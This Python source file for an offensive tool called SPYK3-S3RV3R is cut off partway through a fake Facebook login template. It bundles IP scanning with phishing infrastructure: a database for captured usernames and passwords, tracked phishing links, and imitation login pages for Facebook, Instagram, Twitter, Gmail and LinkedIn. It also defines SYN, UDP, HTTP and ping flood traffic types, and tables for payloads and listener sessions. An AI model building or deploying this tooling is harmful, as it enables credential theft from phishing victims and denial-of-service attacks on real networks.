#!/usr/bin/env python3
"""
🕷️ SPYK3-S3RV3R
 Author: Ian Carter Kulani
Description: Complete IP analysis with graphical reports and statistics
            Merged with Crab-Bot features for 2000+ cybersecurity commands
            Includes SSH command execution, multi-platform bots, REAL traffic generation,
            Nikto scanning, social engineering, and complete IP management
"""

import os
import sys
import json
import time
import socket
import threading
import subprocess
import requests
import logging
import platform
import psutil
import sqlite3
import ipaddress
import re
import random
import datetime
import signal
import select
import base64
import urllib.parse
import uuid
import struct
import http.client
import ssl
import shutil
import asyncio
import hashlib
import paramiko
import getpass
import socketserver
import ctypes
from pathlib import Path
from typing import Dict, List, Set, Optional, Tuple, Any, Union
from dataclasses import dataclass, asdict
from concurrent.futures import ThreadPoolExecutor, ProcessPoolExecutor
from cryptography.fernet import Fernet
from collections import Counter

# =====================
# PLATFORM IMPORTS
# =====================

# Discord
try:
    import discord
    from discord.ext import commands, tasks
    DISCORD_AVAILABLE = True
except ImportError:
    DISCORD_AVAILABLE = False
    print("⚠️ Discord.py not available. Install with: pip install discord.py")

# Telegram
try:
    from telethon import TelegramClient, events
    from telethon.tl.types import MessageEntityCode
    TELETHON_AVAILABLE = True
except ImportError:
    TELETHON_AVAILABLE = False
    print("⚠️ Telethon not available. Install with: pip install telethon")

# WhatsApp (Selenium)
try:
    from selenium import webdriver
    from selenium.webdriver.common.by import By
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    from selenium.webdriver.chrome.options import Options
    from selenium.webdriver.chrome.service import Service
    SELENIUM_AVAILABLE = True
    try:
        from webdriver_manager.chrome import ChromeDriverManager
        WEBDRIVER_MANAGER_AVAILABLE = True
    except ImportError:
        WEBDRIVER_MANAGER_AVAILABLE = False
except ImportError:
    SELENIUM_AVAILABLE = False
    WEBDRIVER_MANAGER_AVAILABLE = False
    print("⚠️ Selenium not available. Install with: pip install selenium webdriver-manager")

# Slack
try:
    from slack_sdk import WebClient
    from slack_sdk.errors import SlackApiError
    from slack_sdk.socket_mode import SocketModeClient
    from slack_sdk.socket_mode.request import SocketModeRequest
    from slack_sdk.socket_mode.response import SocketModeResponse
    SLACK_AVAILABLE = True
except ImportError:
    SLACK_AVAILABLE = False
    print("⚠️ Slack SDK not available. Install with: pip install slack-sdk")

# Signal
SIGNAL_CLI_AVAILABLE = shutil.which('signal-cli') is not None
if not SIGNAL_CLI_AVAILABLE:
    print("⚠️ signal-cli not found. Signal integration will be disabled")

# iMessage (macOS only)
IMESSAGE_AVAILABLE = platform.system().lower() == 'darwin' and shutil.which('osascript') is not None
if not IMESSAGE_AVAILABLE:
    print("⚠️ iMessage integration only available on macOS")

# Scapy for advanced packet generation
try:
    from scapy.all import IP, TCP, UDP, ICMP, Ether, ARP
    from scapy.all import send, sr1, srloop, sendp
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False
    print("⚠️ Scapy not available. Install with: pip install scapy")

# WHOIS
try:
    import whois
    WHOIS_AVAILABLE = True
except ImportError:
    WHOIS_AVAILABLE = False
    print("⚠️ Python-whois not available. Install with: pip install python-whois")

# QR Code generation
try:
    import qrcode
    QRCODE_AVAILABLE = True
except ImportError:
    QRCODE_AVAILABLE = False
    print("⚠️ qrcode not available. Install with: pip install qrcode[pil]")

# URL shortening
try:
    import pyshorteners
    SHORTENER_AVAILABLE = True
except ImportError:
    SHORTENER_AVAILABLE = False
    print("⚠️ pyshorteners not available. Install with: pip install pyshorteners")

# Data visualization imports
try:
    import matplotlib
    matplotlib.use('Agg')
    import matplotlib.pyplot as plt
    import matplotlib.patches as mpatches
    from matplotlib.patches import Circle, Wedge
    import seaborn as sns
    import numpy as np
    GRAPHICS_AVAILABLE = True
except ImportError:
    GRAPHICS_AVAILABLE = False
    print("⚠️ Matplotlib not available. Install with: pip install matplotlib seaborn numpy")

# PDF generation
try:
    from reportlab.lib import colors
    from reportlab.lib.pagesizes import letter, A4
    from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer, Table, TableStyle, Image, PageBreak
    from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
    from reportlab.lib.units import inch
    from reportlab.lib.enums import TA_CENTER, TA_LEFT
    PDF_AVAILABLE = True
except ImportError:
    PDF_AVAILABLE = False
    print("⚠️ ReportLab not available. Install with: pip install reportlab")

# Color handling
class Colors:
    RED = '\033[91m' if os.name != 'nt' else ''
    GREEN = '\033[92m' if os.name != 'nt' else ''
    YELLOW = '\033[93m' if os.name != 'nt' else ''
    BLUE = '\033[94m' if os.name != 'nt' else ''
    MAGENTA = '\033[95m' if os.name != 'nt' else ''
    CYAN = '\033[96m' if os.name != 'nt' else ''
    WHITE = '\033[97m' if os.name != 'nt' else ''
    RESET = '\033[0m' if os.name != 'nt' else ''

# Fix Windows encoding issues
if platform.system().lower() == 'windows':
    try:
        kernel32 = ctypes.windll.kernel32
        kernel32.SetConsoleMode(kernel32.GetStdHandle(-11), 7)
        sys.stdout.reconfigure(encoding='utf-8')
        sys.stderr.reconfigure(encoding='utf-8')
    except:
        pass

# =====================
# CONFIGURATION
# =====================
CONFIG_DIR = ".spyk3"
CONFIG_FILE = os.path.join(CONFIG_DIR, "config.json")
SSH_CONFIG_FILE = os.path.join(CONFIG_DIR, "ssh_config.json")
DISCORD_CONFIG_FILE = os.path.join(CONFIG_DIR, "discord_config.json")
TELEGRAM_CONFIG_FILE = os.path.join(CONFIG_DIR, "telegram_config.json")
WHATSAPP_CONFIG_FILE = os.path.join(CONFIG_DIR, "whatsapp_config.json")
SIGNAL_CONFIG_FILE = os.path.join(CONFIG_DIR, "signal_config.json")
SLACK_CONFIG_FILE = os.path.join(CONFIG_DIR, "slack_config.json")
IMESSAGE_CONFIG_FILE = os.path.join(CONFIG_DIR, "imessage_config.json")
DATABASE_FILE = os.path.join(CONFIG_DIR, "spyk3.db")
LOG_FILE = os.path.join(CONFIG_DIR, "spyk3.log")
REPORT_DIR = "spyk3_reports"
SCAN_RESULTS_DIR = os.path.join(REPORT_DIR, "scans")
BLOCKED_IPS_DIR = os.path.join(REPORT_DIR, "blocked")
GRAPHICS_DIR = os.path.join(REPORT_DIR, "graphics")
PAYLOADS_DIR = os.path.join(CONFIG_DIR, "payloads")
WORKSPACES_DIR = os.path.join(CONFIG_DIR, "workspaces")
SESSION_DATA_DIR = os.path.join(CONFIG_DIR, "sessions")
NIKTO_RESULTS_DIR = os.path.join(CONFIG_DIR, "nikto_results")
WHATSAPP_SESSION_DIR = os.path.join(CONFIG_DIR, "whatsapp_session")
PHISHING_DIR = os.path.join(CONFIG_DIR, "phishing_pages")
TRAFFIC_LOGS_DIR = os.path.join(CONFIG_DIR, "traffic_logs")
PHISHING_TEMPLATES_DIR = os.path.join(CONFIG_DIR, "phishing_templates")
PHISHING_LOGS_DIR = os.path.join(CONFIG_DIR, "phishing_logs")
CAPTURED_CREDENTIALS_DIR = os.path.join(CONFIG_DIR, "captured_credentials")
SSH_KEYS_DIR = os.path.join(CONFIG_DIR, "ssh_keys")
SSH_LOGS_DIR = os.path.join(CONFIG_DIR, "ssh_logs")
TIME_HISTORY_DIR = os.path.join(CONFIG_DIR, "time_history")
TEMP_DIR = "temp"

# Create directories
directories = [
    CONFIG_DIR, REPORT_DIR, SCAN_RESULTS_DIR, BLOCKED_IPS_DIR, GRAPHICS_DIR,
    PAYLOADS_DIR, WORKSPACES_DIR, SESSION_DATA_DIR, NIKTO_RESULTS_DIR,
    WHATSAPP_SESSION_DIR, PHISHING_DIR, TRAFFIC_LOGS_DIR, PHISHING_TEMPLATES_DIR,
    PHISHING_LOGS_DIR, CAPTURED_CREDENTIALS_DIR, SSH_KEYS_DIR, SSH_LOGS_DIR,
    TIME_HISTORY_DIR, TEMP_DIR
]
for directory in directories:
    Path(directory).mkdir(exist_ok=True)

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - SPYK3 - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(LOG_FILE, encoding='utf-8'),
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger("Spyk3")

# =====================
# DATA CLASSES & ENUMS
# =====================

class ScanType:
    QUICK = "quick"
    COMPREHENSIVE = "comprehensive"
    STEALTH = "stealth"
    VULNERABILITY = "vulnerability"
    FULL = "full"
    UDP = "udp"
    OS_DETECTION = "os_detection"
    SERVICE_DETECTION = "service_detection"
    WEB = "web"
    NIKTO = "nikto"

class TrafficType:
    ICMP = "icmp"
    TCP_SYN = "tcp_syn"
    TCP_ACK = "tcp_ack"
    TCP_CONNECT = "tcp_connect"
    UDP = "udp"
    HTTP_GET = "http_get"
    HTTP_POST = "http_post"
    HTTPS = "https"
    DNS = "dns"
    ARP = "arp"
    PING_FLOOD = "ping_flood"
    SYN_FLOOD = "syn_flood"
    UDP_FLOOD = "udp_flood"
    HTTP_FLOOD = "http_flood"
    MIXED = "mixed"
    RANDOM = "random"

class Severity:
    LOW = "low"
    MEDIUM = "medium"
    HIGH = "high"
    CRITICAL = "critical"

class PhishingPlatform:
    FACEBOOK = "facebook"
    INSTAGRAM = "instagram"
    TWITTER = "twitter"
    LINKEDIN = "linkedin"
    GMAIL = "gmail"
    CUSTOM = "custom"

@dataclass
class IPAnalysisResult:
    """Complete IP analysis result"""
    target_ip: str
    timestamp: str
    ping_result: Dict[str, Any]
    traceroute_result: Dict[str, Any]
    port_scan_result: Dict[str, Any]
    geolocation_result: Dict[str, Any]
    traffic_monitor_result: Dict[str, Any]
    security_status: Dict[str, Any]
    recommendations: List[str]
    success: bool = True
    error: Optional[str] = None
    graphics_files: Dict[str, str] = None
    
    def __post_init__(self):
        if not self.timestamp:
            self.timestamp = datetime.datetime.now().isoformat()
        if self.graphics_files is None:
            self.graphics_files = {}

@dataclass
class SSHServer:
    id: str
    name: str
    host: str
    port: int
    username: str
    password: Optional[str] = None
    key_file: Optional[str] = None
    use_key: bool = False
    timeout: int = 30
    created_at: str = None
    last_used: Optional[str] = None
    status: str = "disconnected"
    notes: str = ""

@dataclass
class SSHCommandResult:
    success: bool
    output: str
    error: Optional[str] = None
    execution_time: float = 0.0
    server: str = ""
    command: str = ""

@dataclass
class TrafficGenerator:
    traffic_type: str
    target_ip: str
    target_port: Optional[int]
    duration: int
    packets_sent: int = 0
    bytes_sent: int = 0
    start_time: Optional[str] = None
    end_time: Optional[str] = None
    status: str = "pending"
    error: Optional[str] = None

@dataclass
class ThreatAlert:
    timestamp: str
    threat_type: str
    source_ip: str
    severity: str
    description: str
    action_taken: str

@dataclass
class ScanResult:
    target: str
    scan_type: str
    open_ports: List[Dict]
    timestamp: str
    success: bool
    error: Optional[str] = None
    vulnerabilities: Optional[List[Dict]] = None

@dataclass
class NiktoResult:
    target: str
    timestamp: str
    vulnerabilities: List[Dict]
    scan_time: float
    output_file: str
    success: bool
    error: Optional[str] = None

@dataclass
class PhishingLink:
    id: str
    platform: str
    original_url: str
    phishing_url: str
    template: str
    created_at: str
    clicks: int = 0
    captured_credentials: List[Dict] = None

@dataclass
class CommandResult:
    success: bool
    output: str
    execution_time: float
    error: Optional[str] = None
    data: Optional[Dict] = None

@dataclass
class ManagedIP:
    ip_address: str
    added_by: str
    added_date: str
    notes: str
    is_blocked: bool = False
    block_reason: Optional[str] = None
    blocked_date: Optional[str] = None

@dataclass
class TimeRecord:
    timestamp: str
    command: str
    user: str
    result: str

# =====================
# CONFIGURATION MANAGER
# =====================
class ConfigManager:
    """Configuration manager with encryption for sensitive data"""
    
    DEFAULT_CONFIG = {
        "discord": {
            "enabled": False,
            "token": "",
            "channel_id": "",
            "prefix": "!",
            "admin_role": "Admin",
            "security_role": "Security Team"
        },
        "telegram": {
            "enabled": False,
            "api_id": "",
            "api_hash": "",
            "bot_token": "",
            "phone_number": "",
            "channel_id": ""
        },
        "whatsapp": {
            "enabled": False,
            "phone_number": "",
            "command_prefix": "/",
            "auto_login": False,
            "session_timeout": 3600,
            "allowed_contacts": []
        },
        "signal": {
            "enabled": False,
            "phone_number": "",
            "command_prefix": "!",
            "signal_cli_path": "signal-cli",
            "allowed_numbers": []
        },
        "slack": {
            "enabled": False,
            "bot_token": "",
            "app_token": "",
            "channel_id": "",
            "command_prefix": "!",
            "allowed_users": []
        },
        "imessage": {
            "enabled": False,
            "phone_numbers": [],
            "command_prefix": "!",
            "allowed_numbers": []
        },
        "monitoring": {
            "enabled": True,
            "port_scan_threshold": 10,
            "syn_flood_threshold": 100,
            "udp_flood_threshold": 500,
            "http_flood_threshold": 200,
            "ddos_threshold": 1000
        },
        "scanning": {
            "default_ports": "1-1000",
            "timeout": 30,
            "rate_limit": False
        },
        "security": {
            "auto_block": False,
            "auto_block_threshold": 5,
            "log_level": "INFO",
            "backup_enabled": True,
            "encrypt_passwords": True
        },
        "nikto": {
            "enabled": True,
            "timeout": 300,
            "max_targets": 10,
            "scan_level": 2,
            "ssl_ports": "443,8443,9443",
            "db_check": True
        },
        "traffic_generation": {
            "enabled": True,
            "max_duration": 300,
            "max_packet_rate": 1000,
            "require_confirmation": True,
            "log_traffic": True,
            "allow_floods": False
        },
        "social_engineering": {
            "enabled": True,
            "default_domain": "localhost",
            "default_port": 8080,
            "use_https": False,
            "capture_credentials": True,
            "log_all_requests": True,
            "auto_shorten_urls": True
        },
        "ssh": {
            "enabled": True,
            "default_timeout": 30,
            "max_connections": 5,
            "keep_alive": 60,
            "log_commands": True,
            "allow_command_execution": True
        },
        "reporting": {
            "format": "both",
            "generate_graphics": True,
            "auto_generate": True
        }
    }
    
    @staticmethod
    def get_encryption_key() -> bytes:
        """Get or create encryption key"""
        key_file = os.path.join(CONFIG_DIR, ".key")
        
        if os.path.exists(key_file):
            with open(key_file, 'rb') as f:
                return f.read()
        else:
            key = Fernet.generate_key()
            with open(key_file, 'wb') as f:
                f.write(key)
            return key
    
    @staticmethod
    def encrypt_data(data: str) -> str:
        """Encrypt sensitive data"""
        try:
            key = ConfigManager.get_encryption_key()
            f = Fernet(key)
            return f.encrypt(data.encode()).decode()
        except:
            return data
    
    @staticmethod
    def decrypt_data(data: str) -> str:
        """Decrypt sensitive data"""
        try:
            key = ConfigManager.get_encryption_key()
            f = Fernet(key)
            return f.decrypt(data.encode()).decode()
        except:
            return data
    
    @staticmethod
    def load_config() -> Dict:
        """Load configuration"""
        try:
            if os.path.exists(CONFIG_FILE):
                with open(CONFIG_FILE, 'r') as f:
                    config = json.load(f)
                    for key, value in ConfigManager.DEFAULT_CONFIG.items():
                        if key not in config:
                            config[key] = value
                        elif isinstance(value, dict):
                            for sub_key, sub_value in value.items():
                                if sub_key not in config[key]:
                                    config[key][sub_key] = sub_value
                    return config
        except Exception as e:
            logger.error(f"Failed to load config: {e}")
        
        return ConfigManager.DEFAULT_CONFIG.copy()
    
    @staticmethod
    def save_config(config: Dict) -> bool:
        """Save configuration"""
        try:
            with open(CONFIG_FILE, 'w') as f:
                json.dump(config, f, indent=4)
            logger.info("Configuration saved")
            return True
        except Exception as e:
            logger.error(f"Failed to save config: {e}")
            return False
    
    @staticmethod
    def load_ssh_config() -> List[Dict]:
        """Load SSH server configurations"""
        try:
            if os.path.exists(SSH_CONFIG_FILE):
                with open(SSH_CONFIG_FILE, 'r') as f:
                    configs = json.load(f)
                    
                    for config in configs:
                        if config.get('password', '').startswith('enc:'):
                            config['password'] = ConfigManager.decrypt_data(config['password'][4:])
                    
                    return configs
        except Exception as e:
            logger.error(f"Failed to load SSH config: {e}")
        return []
    
    @staticmethod
    def save_ssh_config(configs: List[Dict], encrypt: bool = True) -> bool:
        """Save SSH server configurations"""
        try:
            configs_to_save = []
            for config in configs:
                config_copy = config.copy()
                
                if encrypt and config_copy.get('password'):
                    config_copy['password'] = 'enc:' + ConfigManager.encrypt_data(config_copy['password'])
                
                configs_to_save.append(config_copy)
            
            with open(SSH_CONFIG_FILE, 'w') as f:
                json.dump(configs_to_save, f, indent=4)
            return True
        except Exception as e:
            logger.error(f"Failed to save SSH config: {e}")
            return False

# =====================
# DATABASE MANAGER
# =====================
class DatabaseManager:
    """SQLite database manager for all data"""
    
    def __init__(self, db_path: str = DATABASE_FILE):
        self.db_path = db_path
        self.conn = sqlite3.connect(db_path, check_same_thread=False)
        self.conn.row_factory = sqlite3.Row
        self.cursor = self.conn.cursor()
        self.init_tables()
    
    def init_tables(self):
        """Initialize database tables"""
        tables = [
            """
            CREATE TABLE IF NOT EXISTS ip_analysis (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                target_ip TEXT NOT NULL,
                analysis_result TEXT NOT NULL,
                report_path TEXT,
                graphics_path TEXT,
                source TEXT DEFAULT 'local'
            )
            """,
            
            """
            CREATE TABLE IF NOT EXISTS blocked_ips (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                ip_address TEXT UNIQUE NOT NULL,
                reason TEXT NOT NULL,
                blocked_by TEXT NOT NULL,
                is_active BOOLEAN DEFAULT 1,
                analysis_result TEXT
            )
            """,
            
            """
            CREATE TABLE IF NOT EXISTS workspaces (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                name TEXT UNIQUE NOT NULL,
                description TEXT,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                active BOOLEAN DEFAULT 0
            )
            """,
            
            """
            CREATE TABLE IF NOT EXISTS hosts (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                workspace_id INTEGER,
                ip_address TEXT NOT NULL,
                hostname TEXT,
                os_info TEXT,
                mac_address TEXT,
                vendor TEXT,
                first_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                last_seen TIMESTAMP,
                notes TEXT,
                FOREIGN KEY (workspace_id) REFERENCES workspaces(id),
                UNIQUE(workspace_id, ip_address)
            )
            """,
            
            """
            CREATE TABLE IF NOT EXISTS services (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                host_id INTEGER,
                port INTEGER NOT NULL,
                protocol TEXT,
                service_name TEXT,
                service_version TEXT,
                state TEXT,
                banner TEXT,
                first_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                last_seen TIMESTAMP,
                FOREIGN KEY (host_id) REFERENCES hosts(id),
                UNIQUE(host_id, port, protocol)
            )
            """,
            
            """
            CREATE TABLE IF NOT EXISTS vulnerabilities (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                host_id INTEGER,
                service_id INTEGER,
                name TEXT,
                description TEXT,
                severity TEXT,
                cve TEXT,
                cvss_score REAL,
                exploit_available BOOLEAN DEFAULT 0,
                discovered TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                FOREIGN KEY (host_id) REFERENCES hosts(id),
                FOREIGN KEY (service_id) REFERENCES services(id)
            )
            """,
            
            """
            CREATE TABLE IF NOT EXISTS sessions (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                session_type TEXT NOT NULL,
                session_id TEXT UNIQUE NOT NULL,
                target_host INTEGER,
                target_port INTEGER,
                lhost TEXT,
                lport INTEGER,
                payload TEXT,
                status TEXT,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                last_active TIMESTAMP,
                FOREIGN KEY (target_host) REFERENCES hosts(id)
            )
            """,
            
            """
            CREATE TABLE IF NOT EXISTS routes (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                subnet TEXT NOT NULL,
                netmask TEXT NOT NULL,
                gateway TEXT,
                session_id INTEGER,
                added_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                active BOOLEAN DEFAULT 1,
                FOREIGN KEY (session_id) REFERENCES sessions(id)
            )
            """,
            
            """
            CREATE TABLE IF NOT EXISTS scans (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                workspace_id INTEGER,
                scan_type TEXT NOT NULL,
                target TEXT NOT NULL,
                options TEXT,
                output_file TEXT,
                started_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                completed_at TIMESTAMP,
                status TEXT,
                FOREIGN KEY (workspace_id) REFERENCES workspaces(id)
            )
            """,
            
            """
            CREATE TABLE IF NOT EXISTS payloads (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                name TEXT NOT NULL,
                payload_type TEXT NOT NULL,
                lhost TEXT NOT NULL,
                lport INTEGER NOT NULL,
                format TEXT NOT NULL,
                output_file TEXT,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
            """,
            
            """
            CREATE TABLE IF NOT EXISTS command_history (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                command TEXT NOT NULL,
                source TEXT DEFAULT 'local',
                success BOOLEAN DEFAULT 1,
                output TEXT,
                execution_time REAL
            )
            """,
            
            """
            CREATE TABLE IF NOT EXISTS time_history (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                command TEXT NOT NULL,
                user TEXT,
                result TEXT
            )
            """,
            
            """
            CREATE TABLE IF NOT EXISTS threats (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                threat_type TEXT NOT NULL,
                source_ip TEXT NOT NULL,
                severity TEXT NOT NULL,
                description TEXT,
                action_taken TEXT,
                resolved BOOLEAN DEFAULT 0
            )
            """,
            
            """
            CREATE TABLE IF NOT EXISTS nikto_scans (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                target TEXT NOT NULL,
                vulnerabilities TEXT,
                output_file TEXT,
                scan_time REAL,
                success BOOLEAN DEFAULT 1
            )
            """,
            
            """
            CREATE TABLE IF NOT EXISTS ssh_servers (
                id TEXT PRIMARY KEY,
                name TEXT NOT NULL,
                host TEXT NOT NULL,
                port INTEGER DEFAULT 22,
                username TEXT NOT NULL,
                password TEXT,
                key_file TEXT,
                use_key BOOLEAN DEFAULT 0,
                timeout INTEGER DEFAULT 30,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                last_used TIMESTAMP,
                status TEXT DEFAULT 'disconnected',
                notes TEXT
            )
            """,
            
            """
            CREATE TABLE IF NOT EXISTS ssh_commands (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                server_id TEXT NOT NULL,
                server_name TEXT,
                command TEXT NOT NULL,
                success BOOLEAN DEFAULT 1,
                output TEXT,
                error TEXT,
                execution_time REAL,
                executed_by TEXT,
                FOREIGN KEY (server_id) REFERENCES ssh_servers(id)
            )
            """,
            
            """
            CREATE TABLE IF NOT EXISTS ssh_sessions (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                server_id TEXT NOT NULL,
                start_time TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                end_time TIMESTAMP,
                commands_count INTEGER DEFAULT 0,
                status TEXT DEFAULT 'active',
                FOREIGN KEY (server_id) REFERENCES ssh_servers(id)
            )
            """,
            
            """
            CREATE TABLE IF NOT EXISTS managed_ips (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                ip_address TEXT UNIQUE NOT NULL,
                added_by TEXT,
                added_date TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                notes TEXT,
                is_blocked BOOLEAN DEFAULT 0,
                block_reason TEXT,
                blocked_date TIMESTAMP,
                threat_level INTEGER DEFAULT 0,
                last_scan TIMESTAMP,
                scan_count INTEGER DEFAULT 0,
                alert_count INTEGER DEFAULT 0
            )
            """,
            
            """
            CREATE TABLE IF NOT EXISTS system_metrics (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                cpu_percent REAL,
                memory_percent REAL,
                disk_percent REAL,
                network_sent INTEGER,
                network_recv INTEGER,
                connections_count INTEGER
            )
            """,
            
            """
            CREATE TABLE IF NOT EXISTS ip_blocks (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                ip_address TEXT NOT NULL,
                action TEXT NOT NULL,
                reason TEXT,
                executed_by TEXT,
                success BOOLEAN DEFAULT 1
            )
            """,
            
            """
            CREATE TABLE IF NOT EXISTS whatsapp_sessions (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                phone_number TEXT UNIQUE NOT NULL,
                session_data TEXT,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                last_active TIMESTAMP,
                status TEXT DEFAULT 'inactive'
            )
            """,
            
            """
            CREATE TABLE IF NOT EXISTS signal_sessions (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                phone_number TEXT UNIQUE NOT NULL,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                last_active TIMESTAMP,
                status TEXT DEFAULT 'inactive'
            )
            """,
            
            """
            CREATE TABLE IF NOT EXISTS traffic_logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                traffic_type TEXT NOT NULL,
                target_ip TEXT NOT NULL,
                target_port INTEGER,
                duration INTEGER,
                packets_sent INTEGER,
                bytes_sent INTEGER,
                status TEXT,
                executed_by TEXT,
                error TEXT
            )
            """,
            
            """
            CREATE TABLE IF NOT EXISTS phishing_links (
                id TEXT PRIMARY KEY,
                platform TEXT NOT NULL,
                original_url TEXT,
                phishing_url TEXT NOT NULL,
                template TEXT NOT NULL,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                clicks INTEGER DEFAULT 0,
                active BOOLEAN DEFAULT 1,
                qr_code_path TEXT
            )
            """,
            
            """
            CREATE TABLE IF NOT EXISTS captured_credentials (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                phishing_link_id TEXT NOT NULL,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                username TEXT,
                password TEXT,
                ip_address TEXT,
                user_agent TEXT,
                additional_data TEXT,
                FOREIGN KEY (phishing_link_id) REFERENCES phishing_links(id)
            )
            """,
            
            """
            CREATE TABLE IF NOT EXISTS phishing_templates (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                name TEXT UNIQUE NOT NULL,
                platform TEXT NOT NULL,
                html_content TEXT,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                last_used TIMESTAMP
            )
            """,
            
            """
            CREATE TABLE IF NOT EXISTS platform_status (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                platform TEXT UNIQUE NOT NULL,
                enabled BOOLEAN DEFAULT 0,
                last_connected TIMESTAMP,
                status TEXT,
                error TEXT
            )
            """,
            
            """
            CREATE TABLE IF NOT EXISTS user_sessions (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                session_id TEXT UNIQUE NOT NULL,
                user_name TEXT,
                start_time TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                last_activity TIMESTAMP,
                commands_count INTEGER DEFAULT 0,
                active BOOLEAN DEFAULT 1
            )
            """,
            
            """
            CREATE TABLE IF NOT EXISTS performance_metrics (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                scan_speed REAL,
                response_time REAL,
                packet_loss REAL,
                bandwidth REAL,
                connections_per_sec INTEGER
            )
            """,
            
            """
            CREATE TABLE IF NOT EXISTS network_connections (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                local_ip TEXT,
                local_port INTEGER,
                remote_ip TEXT,
                remote_port INTEGER,
                protocol TEXT,
                status TEXT
            )
            """,
            
            """
            CREATE TABLE IF NOT EXISTS discord_commands (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                user_id TEXT,
                user_name TEXT,
                target_ip TEXT,
                command TEXT,
                success BOOLEAN
            )
            """
        ]
        
        for table_sql in tables:
            try:
                self.cursor.execute(table_sql)
            except Exception as e:
                logger.error(f"Failed to create table: {e}")
        
        self.conn.commit()
        self.create_default_workspace()
        self._init_phishing_templates()
    
    def create_default_workspace(self):
        """Create default workspace"""
        try:
            self.cursor.execute('''
                INSERT OR IGNORE INTO workspaces (name, description, active)
                VALUES ('default', 'Default workspace', 1)
            ''')
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to create default workspace: {e}")
    
    def _init_phishing_templates(self):
        """Initialize default phishing templates"""
        templates = {
            "facebook_default": {"platform": "facebook", "html": self._get_facebook_template()},
            "instagram_default": {"platform": "instagram", "html": self._get_instagram_template()},
            "twitter_default": {"platform": "twitter", "html": self._get_twitter_template()},
            "gmail_default": {"platform": "gmail", "html": self._get_gmail_template()},
            "linkedin_default": {"platform": "linkedin", "html": self._get_linkedin_template()}
        }
        
        for name, template in templates.items():
            try:
                self.cursor.execute('''
                    INSERT OR IGNORE INTO phishing_templates (name, platform, html_content)
                    VALUES (?, ?, ?)
                ''', (name, template['platform'], template['html']))
            except Exception as e:
                logger.error(f"Failed to insert template {name}: {e}")
        
        self.conn.commit()
    
    def _get_facebook_template(self):
        return """<!DOCTYPE html>
<html>
<head>
    <title>Facebook - Log In or Sign Up</title>
    <style>
        body { font-family: Arial, sans-serif; background-color: #f0f2f5; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .container { max-width: 400px; width: 100%; padding: 20px; }
        .login-box { background-color: white; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,.1), 0 8px 16px rgba(0,0,0,.1); padding: 20px; }
        .logo { text-align: center; margin-bottom: 20px; }
